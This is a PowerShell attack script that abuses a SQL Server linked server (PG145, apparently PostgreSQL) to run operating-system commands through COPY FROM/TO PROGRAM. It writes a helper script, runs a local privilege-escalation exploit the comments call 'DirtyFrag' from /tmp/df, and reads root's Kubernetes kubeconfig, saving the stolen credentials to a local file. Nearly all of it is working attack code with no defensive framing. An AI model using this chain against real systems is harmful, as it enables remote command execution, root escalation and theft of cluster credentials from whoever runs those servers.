$q=[char]39; $dq=[char]36+[char]36

function PG145-Exec($cmd) {
    sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`TRUNCATE cmd_out$q) AT PG145" 2>&1 | Out-Null
    sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`COPY cmd_out FROM PROGRAM $dq$cmd$dq$q) AT PG145" 2>&1 | Out-Null
    $r = sqlcmd -S localhost -x -h -1 -W -Q "SELECT * FROM OPENQUERY(PG145,$q`SELECT line FROM cmd_out$q)" 2>&1
    return ($r | Where-Object {$_ -ne "" -and $_ -ne "NULL" -and $_ -notmatch "rows affected|---"})
}

$out = @()

# Step 1: Write a script that reads kubeconfig and saves to /tmp
$out += "=== WRITING SCRIPT ==="
# Use COPY TO PROGRAM to write script file
sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`COPY (SELECT 'cat /root/.kube/config > /tmp/kube_out.txt 2>&1') TO PROGRAM ${dq}tee /tmp/read_kube.sh${dq}$q) AT PG145" 2>&1 | Out-Null
PG145-Exec "chmod +x /tmp/read_kube.sh" | Out-Null

# Step 2: Run DirtyFrag with the script as input
$out += "=== RUNNING DIRTYFRAG WITH SCRIPT ==="
$r = PG145-Exec "export PATH=/usr/bin:/bin:/usr/sbin:/sbin && echo 'bash /tmp/read_kube.sh' | timeout 45 /tmp/df 2>/dev/null; echo EXPLOIT_EXIT:$?"
$out += $r

# Step 3: Read the kubeconfig output
$out += "=== KUBECONFIG CONTENT ==="
$r = PG145-Exec "cat /tmp/kube_out.txt 2>&1 | head -50"
$out += $r

# Save
$outPath = Join-Path "F:\Database" "k8s_kubeconfig2.txt"
$out | Out-File $outPath -Encoding ASCII
Write-Output "SAVED: $($out.Count) lines"
